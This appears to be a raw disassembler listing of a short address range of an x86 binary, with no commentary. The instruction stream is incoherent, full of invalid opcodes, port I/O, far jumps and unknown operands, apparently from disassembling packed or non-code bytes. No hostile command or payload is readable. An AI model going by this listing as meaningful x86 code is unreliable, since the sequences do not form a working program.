  419b2f:	or     al,0x74
  419b31:	xlat   BYTE PTR ds:[ebx]
  419b32:	inc    ecx
  419b33:	scas   al,BYTE PTR es:[edi]
  419b34:	(bad)  
  419b35:	je     0x419b36
  419b37:	test   eax,0xbaca49d4
  419b3c:	pop    edi
  419b3d:	cld    
  419b3e:	in     al,0x18
  419b40:	dec    esi
  419b41:	jge    0x419b9f
  419b43:	adc    eax,0xb083757c
  419b48:	xchg   esp,eax
  419b49:	loopne 0x419b9d
  419b4b:	fild   DWORD PTR [edi]
  419b4d:	psrlw  mm3,mm1
  419b50:	lods   al,BYTE PTR ds:[esi]
  419b51:	outs   dx,BYTE PTR ds:[esi]
  419b52:	sub    eax,DWORD PTR [ebx-0x29d8b52e]
  419b58:	jmp    0xfcca:0x29fe4120
  419b5f:	mov    esp,0xc4f8d5bb
  419b64:	cmp    bh,dl
  419b66:	or     ecx,ebx
  419b68:	add    eax,0xb4240e56
  419b6d:	retf   
  419b6e:	mov    bl,0x3
  419b70:	xchg   BYTE PTR [edi+0x75],bh
  419b73:	inc    eax
  419b74:	fnstsw WORD PTR [esi]
  419b76:	fmul   DWORD PTR [eax-0x5f]
  419b79:	ss sahf 
  419b7b:	mov    ds:0x70f43371,al
  419b80:	cld    
  419b81:	mov    cl,0x6c
  419b83:	pop    ss
  419b84:	fild   QWORD PTR [eax-0x3a]
  419b87:	fld    TBYTE PTR [eax+0xf]
  419b8a:	test   DWORD PTR [edi+0x7ce00e53],0x73976b47
  419b94:	jmp    0xbb40:0x8e8919fc
  419b9b:	pop    edx
  419b9c:	cdq    
  419b9d:	(bad)  
  419b9f:	or     DWORD PTR gs:[esi-0x4],ebp
  419ba3:	in     al,dx
  419ba4:	outs   dx,DWORD PTR ds:[esi]
  419ba5:	sub    eax,0xdb9eb8b8
  419baa:	pop    es
  419bab:	jge    0x419c0d
  419bad:	lea    edi,[esi+0x26]
  419bb0:	xor    al,0x2d
  419bb2:	xor    DWORD PTR [ebx+0x56355da7],0xaaf7759
  419bbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bbd:	cmp    al,0x19
  419bbf:	and    bl,BYTE PTR [eax+0x6b]
  419bc2:	mov    cl,0xed
  419bc4:	out    dx,al
  419bc5:	ret    0x77c7
  419bc8:	sub    ecx,ebx
  419bca:	loope  0x419bf0
  419bcc:	pop    ss
  419bcd:	popf   
  419bce:	mov    al,0xe
  419bd0:	retf   0x4991
  419bd3:	pop    ds
  419bd4:	and    DWORD PTR [ebp-0x1b914271],esi
  419bda:	das    
  419bdb:	sub    BYTE PTR [ebx+0x543215f6],bh
  419be1:	inc    esi
  419be2:	add    eax,0xffffff89
  419be5:	or     esp,eax
  419be7:	xchg   ah,bl
  419be9:	xor    eax,DWORD PTR [ebx]
  419beb:	mov    dh,0xdb
  419bed:	mov    ah,0xf6
  419bef:	jne    0x419c35
  419bf1:	test   eax,0x2e53dc48
  419bf6:	dec    esp
  419bf7:	popa   
  419bf8:	mov    esp,0x761c05c0
  419bfd:	dec    edi
  419bfe:	inc    eax
  419bff:	sbb    esp,DWORD PTR [esi]
  419c01:	sub    esi,esi
  419c03:	sub    DWORD PTR [ebp-0x37b2f841],edi
  419c09:	cwde   
  419c0a:	test   DWORD PTR [esi],ebx
  419c0c:	outs   dx,DWORD PTR ds:[esi]
  419c0d:	xchg   ecx,eax
  419c0e:	adc    ebx,edi
  419c10:	push   0x18
  419c12:	push   cs
  419c13:	mov    cl,0x56
  419c15:	jo     0x419c14
  419c17:	mov    al,0x2b
  419c19:	mov    cl,0x3
  419c1b:	push   edi
  419c1c:	das    
  419c1d:	scas   eax,DWORD PTR es:[di]
  419c1f:	in     al,0x35
  419c21:	mov    esi,0x6841abd6
  419c26:	ret    0x965a
  419c29:	in     eax,0x75
  419c2b:	push   es
  419c2c:	jmp    0x4f2d:0x40d796a8
  419c33:	addr16 pop eax
  419c35:	fwait
  419c36:	ins    BYTE PTR es:[edi],dx
  419c37:	dec    esi
  419c38:	sti    
  419c39:	pop    esi
  419c3a:	adc    eax,0xf96d649b
  419c3f:	cmp    al,0x8
  419c41:	aas    
  419c42:	imul   edx,DWORD PTR [ebp+0x35241281],0xffffff8e
  419c49:	leave  
  419c4a:	es pusha 
  419c4c:	jg     0x419be7
  419c4e:	and    DWORD PTR [eax],esi
  419c50:	test   ah,0x78
  419c53:	cmp    DWORD PTR ds:0x77c57c51,edx
  419c59:	mov    cl,0x28
  419c5b:	mov    ds:0xf4e6b9f4,eax
  419c60:	mov    dl,0xa2
  419c62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c63:	xchg   ebx,eax
  419c64:	or     esi,esp
  419c66:	mov    DWORD PTR [ecx+ecx*1+0x427c327a],esp
  419c6d:	enter  0xa19f,0xbf
  419c71:	in     al,0xd8
  419c73:	xchg   edx,eax
  419c74:	aas    
  419c75:	inc    ecx
  419c76:	mov    esi,esi
  419c78:	(bad)  
  419c79:	and    ebp,eax
  419c7b:	(bad)
  419c80:	cli    
  419c81:	in     eax,0xfe
  419c83:	jg     0x419c4f
  419c85:	vxorps xmm7,xmm7,XMMWORD PTR [edx]
  419c89:	push   ecx
  419c8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c8b:	mov    ecx,0x8d757c62
  419c90:	popf   
  419c91:	in     al,0x94
  419c93:	loop   0x419c92
  419c95:	inc    edx
  419c96:	inc    edx
  419c97:	popf   
  419c98:	cli    
  419c99:	test   al,0x8a
  419c9b:	imul   edi,ebx,0xfffffff5
  419c9e:	rcr    DWORD PTR [ecx-0x60],cl
  419ca1:	in     al,0x27
  419ca3:	and    DWORD PTR [edx],edx
  419ca5:	scas   eax,DWORD PTR es:[edi]
  419ca6:	pushf  
  419ca7:	mov    eax,eax
  419ca9:	jno    0x419cd9
  419cab:	bound  esp,QWORD PTR [ebp+0x79]
  419cae:	pop    ebp
  419caf:	xchg   edx,eax
  419cb0:	xchg   edi,eax
  419cb1:	push   ss
  419cb2:	in     eax,dx
  419cb3:	pop    edx
  419cb4:	call   0x163f3254
  419cb9:	gs pusha 
  419cbb:	lods   eax,DWORD PTR ds:[esi]
  419cbc:	xor    ah,bl
  419cbe:	add    cl,BYTE PTR [ebx-0x29]
  419cc1:	fmul   DWORD PTR [edx-0x37]
  419cc4:	jp     0x419cb5
  419cc6:	mov    DWORD PTR [ebp-0x56],0x32f91353
  419ccd:	hlt    
  419cce:	jg     0x419cba
  419cd0:	dec    eax
  419cd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cd2:	pop    esi
  419cd3:	fwait
  419cd4:	jl     0x419d19
  419cd6:	outs   dx,BYTE PTR ds:[esi]
  419cd7:	loop   0x419c9c
  419cd9:	fistp  QWORD PTR [eax]
  419cdb:	mov    ds:0x17756ef8,eax
  419ce0:	push   ebp
  419ce1:	jg     0x419d1f
  419ce3:	les    edx,FWORD PTR [esi-0x53db33f9]
  419ce9:	fadd   QWORD PTR [ecx]
  419ceb:	ins    BYTE PTR es:[edi],dx
  419cec:	sar    edi,cl
  419cee:	imul   ebx,DWORD PTR [esi-0x3b],0xffffffe8
  419cf2:	(bad)  
  419cf3:	loope  0x419d47
  419cf5:	loope  0x419d2b
  419cf7:	js     0x419d77
  419cf9:	pop    esp
  419cfa:	mov    esp,DWORD PTR [esi+0x1f06f165]
  419d00:	sub    DWORD PTR [ebx+0x37a2a635],edx
  419d06:	push   0x698ed83b
  419d0b:	imul   ebx,DWORD PTR [edi+0x1a],0x9f2d968b
  419d12:	pop    ds
  419d13:	jmp    DWORD PTR [ebx-0xb23c4c3]
  419d19:	jp     0x419d02
  419d1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d1c:	daa    
  419d1d:	dec    edi
  419d1e:	or     eax,0xaef0e781
  419d23:	stos   DWORD PTR es:[edi],eax
  419d24:	rcr    BYTE PTR [esp+ebp*2+0x38],0xf2
  419d29:	or     DWORD PTR ds:0x1ca7332e,esp
  419d2f:	pop    ebp
  419d30:	das    
  419d31:	mov    edx,ecx
  419d33:	or     BYTE PTR [esi+0x12],ah
  419d36:	jecxz  0x419d36
  419d38:	aas    
  419d39:	out    dx,eax
  419d3a:	retf   
  419d3b:	xchg   ebx,eax
  419d3c:	aas    
  419d3d:	je     0x419d01
  419d3f:	mov    WORD PTR [edi+0x74],cs
  419d42:	or     eax,0x6ae0d3a
  419d47:	cmp    eax,DWORD PTR [esi+eiz*8+0x7a3baf23]
  419d4e:	jb     0x419ce6
  419d50:	mov    ch,0xe
  419d52:	cmp    al,0xf2
  419d54:	mov    ds:0x77937a53,al
  419d59:	adc    eax,0x1b296410
  419d5e:	push   ebp
  419d5f:	es mov eax,0x2efee9b0
  419d65:	js     0x419ce8
  419d67:	cld    
  419d68:	sub    dh,bh
  419d6a:	icebp  
  419d6b:	inc    esp
  419d6c:	repz stc 
  419d6e:	(bad)  
  419d70:	and    esp,DWORD PTR [edi]
  419d72:	adc    al,0xc6
  419d74:	lea    edi,[ebp*2-0x5c797d69]
  419d7b:	scas   al,BYTE PTR es:[edi]
  419d7c:	adc    eax,0xc3245076
  419d81:	jae    0x419d75
  419d83:	or     cl,cl
  419d85:	push   eax
  419d86:	loop   0x419d97
  419d88:	(bad)  
  419d89:	cli    
  419d8a:	mov    edi,0x191f58df
  419d8f:	jp     0x419d75
  419d91:	fdiv   QWORD PTR [edx-0x51]
  419d94:	inc    ecx
  419d95:	sub    ch,BYTE PTR [ebp+0x43c17d65]
  419d9b:	add    BYTE PTR [ebp+0x2bdc9712],0xf7
  419da2:	mov    edx,0xb179a4d4
  419da7:	mov    al,0x3a
  419da9:	call   0x997be368
  419dae:	popa   
  419daf:	fld    TBYTE PTR [edx+0x3bfb8c64]
  419db5:	ror    BYTE PTR [eax+0x56bdb153],1
  419dbb:	and    BYTE PTR [edi-0x46],dl
  419dbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419dbf:	mov    ds:0x6899e40,eax
  419dc4:	dec    eax
  419dc5:	outs   dx,DWORD PTR ds:[esi]
  419dc6:	ja     0x419e2a
  419dc8:	mov    esp,DWORD PTR [edx+0x72]
  419dcb:	mov    dl,0x74
  419dcd:	arpl   WORD PTR [edi+0x12ba773b],sp
  419dd3:	inc    ebx
  419dd4:	cs inc eax
  419dd6:	fbld   TBYTE PTR [esi]
  419dd8:	aam    0x8d
  419dda:	pop    edx
  419ddb:	jo     0x419e37
  419ddd:	cmc    
  419dde:	(bad)  
  419ddf:	sbb    al,0x48
  419de1:	test   BYTE PTR [eax],dh
  419de3:	cld    
  419de4:	add    eax,0xf921306d
  419de9:	hlt    
  419dea:	mov    dl,0xfb
  419dec:	and    DWORD PTR [ebp+0x6d],edi
  419def:	inc    eax
  419df0:	xchg   edx,eax
  419df1:	test   BYTE PTR [esi+0x25a4a475],0x4e
  419df8:	and    DWORD PTR [eax+0x13da22c8],ebx
  419dfe:	push   esi
  419dff:	xchg   ebp,eax
  419e00:	pop    esi
  419e01:	sub    eax,0x4f249114
  419e06:	mov    ds:0x4abc2590,eax
  419e0b:	dec    esi
  419e0c:	hlt    
  419e0d:	xchg   esi,eax
  419e0e:	mov    ecx,0xcad3bd81
  419e13:	arpl   WORD PTR [ebp-0x41a14274],bx
  419e19:	lock out dx,al
  419e1b:	loope  0x419da6
  419e1d:	sub    al,0x9a
  419e1f:	xor    al,0xb5
  419e22:	dec    ebx
  419e23:	mov    eax,0x23a1ce2e
  419e28:	jb     0x419de3
  419e2a:	imul   ebx,DWORD PTR [esp+edi*8],0xfffffff2
  419e2e:	sub    eax,0xe579f2a6
  419e33:	mov    ebx,0x972958c8
  419e38:	inc    BYTE PTR [ebx+0x35]
  419e3b:	pop    ebp
  419e3c:	xchg   edx,eax
  419e3d:	sub    esp,DWORD PTR [edi+esi*4-0x3baf30d3]
  419e44:	xor    edx,DWORD PTR [ecx+0x57]
  419e47:	sti    
  419e48:	sub    dh,dh
  419e4a:	ins    BYTE PTR es:[edi],dx
  419e4b:	ret    
  419e4c:	xchg   esp,eax
  419e4d:	stos   DWORD PTR es:[edi],eax
  419e4e:	gs or  al,0xa4
  419e51:	sahf   
  419e52:	mov    dl,0x4d
  419e54:	pop    ebp
  419e55:	jecxz  0x419dfa
  419e57:	mov    BYTE PTR [edi+0x7fec0e89],al
  419e5d:	popf   
  419e5e:	inc    esp
  419e5f:	ss stc 
  419e61:	jecxz  0x419dfa
  419e63:	out    0x1d,al
  419e65:	mov    cl,0x59
  419e67:	(bad)  
  419e68:	ds push cs
  419e6a:	push   ds
  419e6b:	arpl   WORD PTR [ebp-0x7e05e7b0],bx
  419e71:	push   edx
  419e72:	adc    bl,BYTE PTR [esi+0x24]
  419e75:	in     al,0xcc
  419e77:	fbld   TBYTE PTR [edx]
  419e79:	mov    ebx,0xf3d47957
  419e7e:	arpl   dx,ax
  419e80:	or     esp,DWORD PTR [esi]
  419e82:	sub    eax,0xd7dcc6fc
  419e87:	and    DWORD PTR [ebp+0x70],esp
  419e8a:	mov    edi,0x57682ac4
  419e8f:	stos   BYTE PTR es:[edi],al
  419e90:	sub    al,BYTE PTR [eax-0x66]
  419e93:	xchg   esi,eax
  419e94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e95:	xchg   ecx,eax
  419e96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e97:	ret    
  419e98:	into   
  419e99:	jg     0x419e90
  419e9b:	sbb    BYTE PTR [edx-0x63],bh
  419e9e:	jp     0x419e96
  419ea0:	ss retf 
  419ea2:	das    
  419ea3:	pop    ebx
  419ea4:	adc    dh,BYTE PTR [esi]
  419ea6:	adc    BYTE PTR [edx-0x1451dec9],dh
  419eac:	mov    BYTE PTR [ecx-0x17],cl
  419eaf:	xchg   ebp,eax
  419eb0:	lods   al,BYTE PTR ds:[esi]
  419eb1:	out    0x58,al
  419eb3:	outs   dx,BYTE PTR ds:[esi]
  419eb4:	ror    bl,1
  419eb6:	dec    esp
  419eb7:	in     eax,0xae
  419eb9:	outs   dx,DWORD PTR ds:[esi]
  419ebb:	or     DWORD PTR cs:[eax+0x147dedb3],esi
  419ec2:	mov    es:0x6ecc4c76,al
  419ec8:	loopne 0x419ec1
  419eca:	jb     0x419e8b
  419ecc:	mov    eax,ds:0xf0a8b41c
  419ed1:	test   al,0x5d
  419ed3:	enter  0xf5ec,0x6
  419ed7:	aam    0x5f
  419ed9:	test   BYTE PTR [edx+0x54ab6a5f],ch
  419edf:	sbb    al,0x9f
  419ee1:	fistp  QWORD PTR [esi+edi*4-0x70]
  419ee5:	push   ds
  419ee6:	or     al,0xf9
  419ee8:	add    eax,0x5a193825
  419eed:	sar    BYTE PTR [ecx-0x7b],1
  419ef0:	xor    eax,0xf323172
  419ef5:	sbb    esp,edi
  419ef7:	and    eax,0xae147096
  419efc:	fistp  DWORD PTR [ebp+0x2e46cb32]
  419f02:	outs   dx,DWORD PTR ds:[esi]
  419f03:	call   0x333092e
  419f08:	cwde   
  419f09:	mov    eax,ds:0x35f72081
  419f0e:	push   cs
  419f0f:	sub    dl,BYTE PTR ds:0x4ea1c4e
  419f15:	mov    bh,BYTE PTR ds:0x7c722d4
  419f1b:	and    eax,ecx
  419f1d:	in     al,0x15
  419f1f:	call   0x6448:0xda34ed6e
  419f26:	jnp    0x419f67
  419f28:	stos   DWORD PTR es:[edi],eax
  419f29:	pop    ss
  419f2a:	jne    0x419ec7
  419f2c:	nop
  419f2d:	mov    ds,WORD PTR [edi]
  419f2f:	nop
  419f30:	outs   dx,BYTE PTR ds:[esi]
  419f31:	xor    edx,eax
  419f33:	daa    
  419f34:	hlt    
  419f35:	aam    0x4f
  419f37:	push   cs
  419f38:	mov    WORD PTR [ecx+esi*4+0x1d],gs
  419f3c:	shr    ch,0x36
  419f3f:	sar    BYTE PTR [ebp+0x54cf1d8c],0xc2
  419f46:	dec    esp
  419f47:	push   ebp
  419f48:	cwde   
  419f49:	sahf   
  419f4a:	mov    ah,0xcb
  419f4c:	sub    BYTE PTR [ecx+ecx*4],al
  419f4f:	push   0xffffff95
  419f51:	fdivr  QWORD PTR [edi]
  419f53:	je     0x419f24
  419f55:	ja     0x419f0d
  419f57:	xchg   esi,eax
  419f58:	out    dx,al
  419f59:	mov    edi,0xba226583
  419f5e:	mov    dh,0x27
  419f60:	or     eax,0x934391ac
  419f65:	rcr    bl,1
  419f67:	and    al,0x9a
  419f69:	cmp    al,0x5d
  419f6b:	into   
  419f6c:	or     al,BYTE PTR [edx]
  419f6e:	cmp    BYTE PTR [ebx-0x3a75c2b],dl
  419f74:	and    ebx,0x5b
  419f77:	shr    ebp,cl
  419f79:	mov    dh,0x40
  419f7b:	fiadd  WORD PTR [esi]
  419f7d:	fst    QWORD PTR [bp+si]
  419f80:	pop    ss
  419f81:	icebp  
  419f82:	push   cs
  419f83:	add    eax,0xc67b4ff1
  419f88:	jne    0x419fd9
  419f8a:	or     BYTE PTR [ebx+0x7c4c2584],0x7b
  419f91:	retf   0xe7b8
  419f94:	add    al,0x1
  419f96:	push   ss
  419f97:	push   edx
  419f98:	xor    ecx,ecx
  419f9a:	test   al,0x2a
  419f9c:	(bad)  
  419f9e:	scas   eax,DWORD PTR es:[edi]
  419f9f:	jae    0x419fdd
  419fa1:	mov    ebx,?
  419fa3:	add    BYTE PTR [ecx],ch
  419fa5:	inc    esp
  419fa6:	lea    ebx,[ebx+0x55461e2]
  419fac:	adc    edi,0xffffffda
  419faf:	loope  0x419f5f
  419fb1:	inc    ebp
  419fb2:	mov    bh,0x17
  419fb4:	sub    eax,0x9a8d5fd1
  419fb9:	inc    ebx
  419fba:	xchg   esp,eax
  419fbb:	mov    dh,0xb3
  419fbd:	cmp    al,0x5c
  419fbf:	fst    DWORD PTR [edi]
  419fc1:	fild   QWORD PTR [esi+0x7]
  419fc4:	(bad)  
  419fc6:	popf   
  419fc7:	xor    edi,ebx
  419fc9:	mov    ebx,eax
  419fcb:	xor    DWORD PTR [eax],esi
  419fcd:	and    al,0x9c
  419fcf:	xor    edx,DWORD PTR [esi+0x3bb49864]
  419fd5:	sub    eax,0x5ef7d279
  419fda:	stc    
  419fdb:	or     ah,bl
  419fdd:	hlt    
  419fde:	jecxz  0x41a045
  419fe0:	into   
  419fe1:	xlat   BYTE PTR ds:[ebx]
  419fe2:	retf   
  419fe3:	push   esi
  419fe4:	xchg   ebx,eax
  419fe5:	mov    ebp,0xb34503bd
  419fea:	fst    DWORD PTR ds:0x3c26c336
  419ff0:	cmp    cl,BYTE PTR [ecx-0x566b70d3]
  419ff6:	pop    edi
  419ff7:	mov    ds:0x730d0397,eax
  419ffc:	gs loop 0x41a01d
  419fff:	sbb    al,0x32
  41a001:	inc    esi
  41a002:	in     al,dx
  41a003:	aas    
  41a004:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a005:	lahf   
  41a006:	out    0x50,al
  41a008:	fsubr  QWORD PTR [esi+0x447e02c4]
  41a00e:	push   esi
  41a00f:	add    DWORD PTR [edi+eiz*8],ebx
  41a012:	loop   0x419fb3
  41a014:	dec    esi
  41a015:	lods   al,BYTE PTR ds:[esi]
  41a016:	xchg   ebp,eax
  41a017:	pcmpeqb mm3,QWORD PTR [ebx]
  41a01a:	adc    al,0x59
  41a01c:	inc    ebp
  41a01d:	mov    ?,WORD PTR [ecx]
  41a01f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a020:	xchg   ecx,eax
  41a021:	and    eax,0x4e528ec0
  41a027:	out    dx,al
  41a028:	xchg   edi,eax
  41a029:	jge    0x419fc8
  41a02b:	jae    0x41a060
  41a02d:	mov    cl,BYTE PTR [ecx+0x3c]
  41a030:	leave  
  41a031:	icebp  
  41a032:	jnp    0x41a088
  41a034:	lods   eax,DWORD PTR ds:[esi]
  41a035:	mov    ah,al
  41a037:	leave  
  41a038:	mov    al,0x1f
  41a03a:	mov    al,0x12
  41a03c:	sub    BYTE PTR [edi+0x637e5760],0x45
  41a043:	stos   DWORD PTR es:[edi],eax
  41a044:	adc    BYTE PTR [ebx+0x17c7c69a],0x31
  41a04b:	sbb    eax,0x7892b614
  41a050:	cmp    ch,0x26
  41a053:	test   eax,0x744f84be
  41a058:	test   al,0x11
  41a05a:	dec    ebp
  41a05b:	in     eax,dx
  41a05c:	repnz xor al,0x68
  41a05f:	cmp    edx,DWORD PTR gs:[eax]
  41a062:	(bad)  
  41a063:	jmp    0xb9f70878
  41a068:	in     al,dx
  41a069:	sahf   
  41a06a:	loopne 0x41a03a
  41a06c:	push   eax
  41a06d:	and    ah,cl
  41a06f:	push   es
  41a070:	pushf  
  41a071:	and    DWORD PTR [ebp-0x53df5eff],ebx
  41a077:	(bad)  
  41a078:	xor    eax,0x2bf99e13
  41a07d:	arpl   WORD PTR [ecx-0x14],dx
  41a080:	retf   
  41a081:	sar    DWORD PTR [ebx+ebp*2],cl
  41a084:	inc    ecx
  41a085:	out    dx,al
  41a086:	xor    al,0x77
  41a088:	xor    DWORD PTR [edi+0x32],edi
  41a08b:	xchg   edi,eax
  41a08c:	add    edi,DWORD PTR [ecx]
  41a08e:	les    ecx,FWORD PTR [edx+0x46]
  41a091:	cmp    esp,DWORD PTR [edi-0x6dd35e84]
  41a097:	outs   dx,DWORD PTR ds:[esi]
  41a098:	pushf  
  41a099:	mov    ds:0xd4f55ed0,eax
  41a09e:	pop    edi
  41a09f:	fsubp  st(4),st
  41a0a1:	mov    edi,0xf67241a9
  41a0a6:	(bad)  
  41a0a7:	mov    ebp,0xf1f7943a
  41a0ac:	std    
  41a0ad:	icebp  
  41a0ae:	lds    esp,FWORD PTR [esi-0xa3269b2]
  41a0b4:	xchg   ebx,eax
  41a0b5:	jmp    0x3bdf0734
  41a0ba:	ficomp WORD PTR [eax+0x7b]
  41a0bd:	(bad)  
  41a0be:	lea    ebx,[eax-0x59]
  41a0c1:	mul    eax
  41a0c3:	nop
  41a0c4:	mov    eax,0x187a1a66
  41a0ca:	push   ecx
  41a0cb:	mov    ecx,0x9596b8d5
  41a0d0:	scas   eax,DWORD PTR es:[edi]
  41a0d1:	jne    0x41a0c6
  41a0d3:	in     al,0xab
  41a0d5:	into   
  41a0d6:	ret    
  41a0d7:	adc    dh,bh
  41a0d9:	adc    eax,0x16f1c30a
  41a0de:	lds    edi,FWORD PTR [ecx]
  41a0e0:	inc    ebp
  41a0e1:	pop    ebp
  41a0e2:	scas   eax,DWORD PTR es:[edi]
  41a0e3:	mov    eax,ds:0x6f650914
  41a0e8:	jg     0x41a080
  41a0ea:	fidivr WORD PTR [eax]
  41a0ec:	fild   DWORD PTR [edx]
  41a0ee:	sbb    ebp,DWORD PTR [ecx]
  41a0f0:	js     0x41a0d1
  41a0f2:	popa   
  41a0f3:	in     al,0x30
  41a0f5:	gs repz adc bh,ah
  41a0f9:	ins    DWORD PTR es:[edi],dx
  41a0fa:	mov    cl,0x89
  41a0fc:	sub    DWORD PTR [ebx+0x27],eax
  41a0ff:	dec    edx
  41a100:	icebp  
  41a101:	fs ins DWORD PTR es:[edi],dx
  41a103:	xor    eax,0xa47efa8b
  41a108:	stos   BYTE PTR es:[edi],al
  41a109:	and    al,0x8e
  41a10b:	xchg   esp,eax
  41a10c:	into   
  41a10d:	push   ebx
  41a10e:	ins    BYTE PTR es:[edi],dx
  41a10f:	aas    
  41a110:	jb     0x41a0f5
  41a112:	push   cs
  41a113:	push   ds
  41a114:	and    eax,ebp
  41a116:	jmp    0x41a0fa
  41a118:	(bad)  [esi-0x35]
  41a11b:	jmp    0x41a13e
  41a11d:	pop    edi
  41a11e:	dec    ebp
  41a11f:	sbb    al,0x43
  41a121:	(bad)  
  41a122:	repz or edi,DWORD PTR [edi]
  41a125:	sti    
  41a126:	xchg   ebp,eax
  41a127:	icebp  
  41a128:	sub    eax,0x2a30eb28
  41a12d:	inc    ebp
  41a12e:	mov    eax,ecx
  41a130:	pop    ds
  41a131:	cmp    BYTE PTR [edx-0x1a],dh
  41a134:	(bad)  
  41a135:	xor    eax,0xd879e4f7
  41a13a:	test   BYTE PTR ds:0x5fa3817a,0x8d
  41a141:	shl    BYTE PTR [edx],cl
  41a143:	pop    ebp
  41a144:	inc    edi
  41a145:	test   al,ch
  41a147:	nop
  41a148:	in     eax,0x9f
  41a14a:	jle    0x41a189
  41a14c:	imul   esi,DWORD PTR [eax-0x2b91be07],0xffffffe7
  41a153:	add    ebp,edx
  41a155:	mov    dl,0x4e
  41a157:	xchg   ebx,eax
  41a158:	jmp    0x8852a4a0
  41a15d:	xor    DWORD PTR [ebx],esp
  41a15f:	xor    esi,DWORD PTR [esi-0x22]
  41a162:	repz call 0x54f554d1
  41a168:	ds push ds
  41a16a:	inc    ebx
  41a16b:	pop    esi
  41a16c:	jo     0x41a19c
  41a16e:	nop
  41a16f:	je     0x41a132
  41a171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a172:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a173:	inc    eax
  41a174:	dec    edi
  41a175:	mov    BYTE PTR [eax-0x7547e5d2],al
  41a17b:	mov    al,ds:0x736a45bb
  41a180:	xor    esi,eax
  41a182:	jge    0x41a16a
  41a184:	sub    DWORD PTR [edx+0xc],0xbb8ad819
  41a18b:	xchg   esp,eax
  41a18c:	(bad)  
  41a18d:	xor    eax,0xe5c7ad5b
  41a192:	xchg   esi,eax
  41a193:	push   edi
  41a194:	push   0x2d9fa9d8
  41a199:	pop    edx
  41a19a:	jb     0x41a1af
  41a19c:	push   ss
  41a19d:	inc    ebx
  41a19e:	mov    bh,0x41
  41a1a0:	rcr    DWORD PTR [esi+eiz*8-0x3d5e47f0],cl
  41a1a7:	iret   
  41a1a8:	jns    0x41a1a6
  41a1aa:	lock ret 0x72fd
  41a1ae:	push   eax
  41a1af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1b0:	fsubr  st,st(6)
  41a1b2:	jp     0x41a214
  41a1b4:	xchg   ebp,eax
  41a1b5:	les    ebp,FWORD PTR ss:[esp+eiz*8+0x6978e173]
  41a1bd:	retf   0x5d65
  41a1c0:	sbb    ebp,DWORD PTR [esi*4+0xec2a95c]
  41a1c7:	mov    ds:0x93c7f02b,al
  41a1cc:	push   eax
  41a1cd:	dec    esi
  41a1ce:	adc    edx,ecx
  41a1d0:	les    edx,FWORD PTR [eax]
  41a1d2:	xor    cl,al
  41a1d4:	mov    al,ds:0xc68274a2
  41a1d9:	sub    al,0x5f
  41a1db:	mov    esi,0x71555693
  41a1e0:	or     bl,BYTE PTR [esi-0x63]
  41a1e3:	(bad)  
  41a1e4:	pop    ecx
  41a1e5:	jo     0x41a1e0
  41a1e7:	les    eax,FWORD PTR [eax+0x32]
  41a1ea:	xchg   ebp,eax
  41a1eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1ec:	xor    bh,BYTE PTR [ebx-0x7cef62e7]
  41a1f2:	dec    edx
  41a1f3:	addr16 cli 
  41a1f5:	les    esp,FWORD PTR [ecx]
  41a1f7:	cmova  esp,ecx
  41a1fa:	popf   
  41a1fb:	mov    al,ds:0x7c6a714d
  41a200:	pop    ss
  41a201:	add    BYTE PTR [esi-0x1e],0x9d
  41a205:	stos   BYTE PTR es:[edi],al
  41a206:	jmp    0x41a1c1
  41a208:	outs   dx,BYTE PTR ds:[esi]
  41a209:	and    ecx,DWORD PTR [ecx]
  41a20b:	sbb    DWORD PTR ds:0x4b49b41,eax
  41a211:	cmp    ecx,DWORD PTR [ecx+0x3db4695c]
  41a217:	cmp    bh,bh
  41a219:	test   BYTE PTR [edx+0x0],0x36
  41a21d:	sbb    BYTE PTR [edx+edx*1],al
  41a220:	and    al,0xeb
  41a222:	or     al,BYTE PTR [ebx+0x1a996ff]
  41a228:	es jbe 0x41a280
  41a22b:	sub    DWORD PTR [edx],ebx
  41a22d:	popf   
  41a22e:	ins    BYTE PTR es:[edi],dx
  41a22f:	mov    bh,0x43
  41a231:	sub    dl,BYTE PTR [ecx+eiz*2+0xe]
  41a235:	add    bh,BYTE PTR [esi+0x7ee4083c]
  41a23b:	enter  0x8e4b,0x67
  41a23f:	ret    
  41a240:	add    ebx,0xffffffbd
  41a243:	cwde   
  41a244:	cs sbb bl,cl
  41a247:	mov    ds:0xe76708af,al
  41a24c:	mov    BYTE PTR [ecx-0x5d],bl
  41a24f:	clc    
  41a250:	push   eax
  41a251:	jnp    0x41a27b
  41a253:	fs inc ebx
  41a255:	mov    edx,0x81f030ae
  41a25a:	sub    DWORD PTR [eiz*1+0x4cc1ccfd],edi
  41a261:	jne    0x41a2d5
  41a263:	pop    edi
  41a264:	out    0x91,al
  41a266:	(bad)  
  41a267:	in     al,0x19
  41a269:	fwait
  41a26a:	sbb    BYTE PTR [edi-0x25],bh
  41a26d:	popf   
  41a26e:	sub    cl,dh
  41a270:	les    ebx,FWORD PTR [ecx+0x25]
  41a273:	xchg   edi,eax
  41a274:	popa   
  41a275:	not    BYTE PTR [ebx-0x6471fb52]
  41a27b:	mov    ah,0x2d
  41a27d:	dec    edi
  41a27e:	sar    BYTE PTR [eax-0x27],1
  41a281:	in     eax,dx
  41a282:	sbb    eax,ebx
  41a284:	test   al,0xd
  41a286:	arpl   WORD PTR [eax],cx
  41a288:	das    
  41a289:	push   ds
  41a28a:	ja     0x41a20f
  41a28c:	je     0x41a2ad
  41a28e:	cmc    
  41a28f:	mov    bl,0x62
  41a291:	in     al,dx
  41a292:	mov    ds:0x641e9d3c,al
  41a297:	sbb    DWORD PTR [ebx+ebx*2],0xd3d28fe9
  41a29e:	and    al,0x4b
  41a2a0:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41a2a2:	nop
